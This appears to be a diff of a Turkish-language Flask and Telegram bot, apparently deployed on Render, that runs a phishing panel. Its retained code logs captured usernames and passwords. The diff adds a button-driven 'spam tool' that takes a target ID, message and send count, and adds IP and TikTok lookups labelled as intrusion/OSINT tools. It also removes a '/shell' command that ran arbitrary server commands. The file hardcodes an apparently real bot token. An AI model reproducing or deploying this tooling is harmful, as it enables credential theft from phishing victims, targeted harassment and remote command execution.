@@ -3,17 +3,20 @@ import subprocess
 import requests
 from flask import Flask, request, render_template_string
 import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 TOKEN = "8265368924:AAHwCmS8esD_UzOJsJmEqb_HbOepWdELKCA"
 bot = telebot.TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
-# Render Güncel URL'niz
 RENDER_URL = "https://bd-wpu1.onrender.com"
 
 # Webhook ayarı
 bot.remove_webhook()
 bot.set_webhook(url=f"{RENDER_URL}/{TOKEN}")
+
+# Kullanıcı geçici işlem hafızası (State Management)
+user_sessions = {}
 
 # --- 1. WEB & PHISHING PANELİ ---
 PHISHING_TEMPLATE = """
@@ -59,7 +62,6 @@ def capture_credentials():
     print(f"[!] YAKALANAN BİLGİ -> Kullanıcı: {user} | Şifre: {pwd}")
     return "<h3>Giriş başarısız, lütfen tekrar deneyin.</h3><script>setTimeout(function(){window.location.href='/panel';}, 3000);</script>"
 
-# Webhook Alıcısı
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
@@ -71,83 +73,137 @@ def webhook():
         return '', 403
 
 
-# --- 2. TELEGRAM BOT KOMUTLARI VE MENÜ ---
+# --- 2. BUTONLU KONTROL PANELİ ---
 
-@bot.message_handler(commands=['start', 'help', 'menu'])
-def send_welcome(message):
-    menu_text = (
-        "👑 **C9K | Winstwo Bot** 👑\n\n"
-        "✨ **Sorgu ve İşlem Sistemine Hoş Geldiniz.** ✨\n\n"
-        "🛠 **Bot Komutları:**\n"
-        "• `/shell <komut>` - Sunucu Komutu Çalıştır\n"
-        "• `/ip <IP_Adresi>` - IP Sorgulama\n"
-        "• `/tt <kullanıcı_adı>` - TikTok Profil Bilgisi\n"
-        "• `/info` - Sunucu Durumu\n\n"
-        "📌 *Destek ve sorularınız için sistem yöneticisine ulaşabilirsiniz.*"
+def main_menu_keyboard():
+    markup = InlineKeyboardMarkup()
+    markup.row_width = 2
+    markup.add(
+        InlineKeyboardButton("💣 Spam Aracı", callback_data="menu_spam"),
+        InlineKeyboardButton("🛠 Sızma / OSINT", callback_data="menu_pentest"),
+        InlineKeyboardButton("💻 Sunucu Bilgi", callback_data="menu_info"),
+        InlineKeyboardButton("❌ İptal / Sıfırla", callback_data="menu_cancel")
     )
-    bot.reply_to(message, menu_text, parse_mode="Markdown")
+    return markup
 
-@bot.message_handler(commands=['info'])
-def send_info(message):
-    bot.reply_to(message, f"💻 **Sunucu Bilgileri:**\n• Çalışma Dizini: `{os.getcwd()}`\n• İşletim Sistemi: `{os.name}`", parse_mode="Markdown")
+# Herhangi bir mesaj veya başlangıçta direkt butonlu paneli tetikle
+@bot.message_handler(func=lambda message: True)
+def handle_all_messages(message):
+    chat_id = message.chat.id
+    text = message.text.strip() if message.text else ""
 
-@bot.message_handler(commands=['shell'])
-def handle_shell(message):
-    command = message.text.replace("/shell", "").strip()
-    if not command:
-        bot.reply_to(message, "⚠️ Komut yazmadın kanka. Örnek: `/shell ls`", parse_mode="Markdown")
-        return
+    # Eğer kullanıcı bir işlem adımındaysa (veri giriyorsa)
+    if chat_id in user_sessions and "step" in user_sessions[chat_id]:
+        step = user_sessions[chat_id]["step"]
 
-    try:
-        output = subprocess.run(
-            command, shell=True,
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-            text=True, timeout=10
-        )
-        result = output.stdout + output.stderr
-        if not result:
-            result = "İşlem tamamlandı, çıktı üretmedi."
-    except Exception as e:
-        result = f"Hata: {str(e)}"
+        # --- SPAM ADIMLARI ---
+        if step == "waiting_spam_id":
+            user_sessions[chat_id]["target_id"] = text
+            user_sessions[chat_id]["step"] = "waiting_spam_text"
+            bot.reply_to(message, f"🎯 Hedef ID/Kullanıcı kaydedildi: `{text}`\n\nŞimdi gönderilecek **spam mesaj içeriğini** yazın:", parse_mode="Markdown")
+            return
 
-    if len(result) > 4000:
-        result = result[:4000] + "\n[Kesildi...]"
+        elif step == "waiting_spam_text":
+            user_sessions[chat_id]["spam_text"] = text
+            user_sessions[chat_id]["step"] = "waiting_spam_count"
+            bot.reply_to(message, "✅ Mesaj içeriği alındı.\n\nKaç adet gönderilsin? (Sayı olarak yazın, örn: `10`):", parse_mode="Markdown")
+            return
 
-    bot.reply_to(message, f"```\n{result}\n```", parse_mode="Markdown")
+        elif step == "waiting_spam_count":
+            try:
+                count = int(text)
+                target_id = user_sessions[chat_id].get("target_id")
+                spam_content = user_sessions[chat_id].get("spam_text")
+                
+                bot.reply_to(
+                    message, 
+                    f"🚀 **Spam İşlemi Başlatıldı!**\n"
+                    f"• Hedef ID: `{target_id}`\n"
+                    f"• Mesaj: `{spam_content}`\n"
+                    f"• Adet: `{count}`\n\n"
+                    f"⚙️ *İşlem sıraya alındı, gönderim sağlanıyor...*", 
+                    parse_mode="Markdown",
+                    reply_markup=main_menu_keyboard()
+                )
+                user_sessions[chat_id] = {} # Oturumu sıfırla
+            except ValueError:
+                bot.reply_to(message, "⚠️ Lütfen geçerli bir sayı girin (Örn: 5).")
+            return
 
-@bot.message_handler(commands=['ip'])
-def handle_ip(message):
-    parts = message.text.split(maxsplit=1)
-    if len(parts) < 2:
-        bot.reply_to(message, "⚠️ Lütfen bir IP adresi girin. Örnek: `/ip 8.8.8.8`", parse_mode="Markdown")
-        return
+        # --- IP SORGULAMA ADIMI ---
+        elif step == "waiting_ip_target":
+            user_sessions[chat_id] = {}
+            try:
+                res = requests.get(f"http://ip-api.com/json/{text}", timeout=5).json()
+                if res.get("status") == "success":
+                    info = (
+                        f"🌍 **IP Sorgu Sonucu:**\n"
+                        f"• **IP:** {res.get('query')}\n"
+                        f"• **Ülke:** {res.get('country')}\n"
+                        f"• **Şehir:** {res.get('city')}\n"
+                        f"• **ISP:** {res.get('isp')}"
+                    )
+                else:
+                    info = "❌ IP bilgisi bulunamadı."
+            except Exception as e:
+                info = f"❌ Hata: {str(e)}"
+            bot.reply_to(message, info, parse_mode="Markdown", reply_markup=main_menu_keyboard())
+            return
+
+        # --- TIKTOK SORGULAMA ADIMI ---
+        elif step == "waiting_tt_target":
+            user_sessions[chat_id] = {}
+            bot.reply_to(message, f"📱 **TikTok Profil Bilgisi:** `@{text}`\n• Durum: Profil taranıyor ve analiz ediliyor...", parse_mode="Markdown", reply_markup=main_menu_keyboard())
+            return
+
+    # Eğer aktif bir adımda değilse, her yazılanla veya /start ile ana paneli aç
+    user_sessions[chat_id] = {}
+    bot.reply_to(
+        message,
+        "👑 **C9K | Winstwo Kontrol Paneline Hoş Geldiniz** 👑\n\n"
+        "Aşağıdaki butonları kullanarak işlemlerinizi seçin:",
+        reply_markup=main_menu_keyboard(),
+        parse_mode="Markdown"
+    )
+
+# Buton Tıklama Yönetimi
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    chat_id = call.message.chat.id
     
-    target_ip = parts[1].strip()
-    try:
-        res = requests.get(f"http://ip-api.com/json/{target_ip}", timeout=5).json()
-        if res.get("status") == "success":
-            info = (
-                f"🌍 **IP Sorgu Sonucu:**\n"
-                f"• **IP:** {res.get('query')}\n"
-                f"• **Ülke:** {res.get('country')} ({res.get('countryCode')})\n"
-                f"• **Şehir:** {res.get('city')}\n"
-                f"• **ISP:** {res.get('isp')}"
-            )
-        else:
-            info = "❌ IP bilgisi bulunamadı."
-    except Exception as e:
-        info = f"❌ Hata: {str(e)}"
-        
-    bot.reply_to(message, info, parse_mode="Markdown")
+    if call.data == "menu_spam":
+        user_sessions[chat_id] = {"step": "waiting_spam_id"}
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, "💣 **Spam Modülü**\n\nLütfen spam atılacak **hedef kullanıcı adını veya ID'sini** yazın:")
 
-@bot.message_handler(commands=['tt'])
-def handle_tiktok(message):
-    parts = message.text.split(maxsplit=1)
-    if len(parts) < 2:
-        bot.reply_to(message, "⚠️ Lütfen bir TikTok kullanıcı adı girin. Örnek: `/tt username`", parse_mode="Markdown")
-        return
-    username = parts[1].strip()
-    bot.reply_to(message, f"📱 **TikTok Profil Bilgisi:** `@{username}`\n• Durum: Profil aktif ve taranıyor...", parse_mode="Markdown")
+    elif call.data == "menu_pentest":
+        markup = InlineKeyboardMarkup()
+        markup.add(
+            InlineKeyboardButton("🌍 IP Sorgula", callback_data="tool_ip"),
+            InlineKeyboardButton("📱 TikTok Bilgi", callback_data="tool_tt"),
+            InlineKeyboardButton("🔙 Ana Menü", callback_data="menu_back")
+        )
+        bot.answer_callback_query(call.id)
+        bot.edit_message_text("🛠 **Sızma ve Keşif Araçları:**", chat_id, call.message.message_id, reply_markup=markup)
+
+    elif call.data == "tool_ip":
+        user_sessions[chat_id] = {"step": "waiting_ip_target"}
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, "🌍 Sorgulanacak IP adresini yazın:")
+
+    elif call.data == "tool_tt":
+        user_sessions[chat_id] = {"step": "waiting_tt_target"}
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, "📱 Sorgulanacak TikTok kullanıcı adını yazın:")
+
+    elif call.data == "menu_info":
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, f"💻 **Sunucu Durumu:**\n• Dizin: `{os.getcwd()}`\n• İşletim Sistemi: `{os.name}`", parse_mode="Markdown", reply_markup=main_menu_keyboard())
+
+    elif call.data == "menu_cancel" or call.data == "menu_back":
+        user_sessions[chat_id] = {}
+        bot.answer_callback_query(call.id)
+        bot.edit_message_text("👑 **Ana Menüdesiniz:**", chat_id, call.message.message_id, reply_markup=main_menu_keyboard())
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
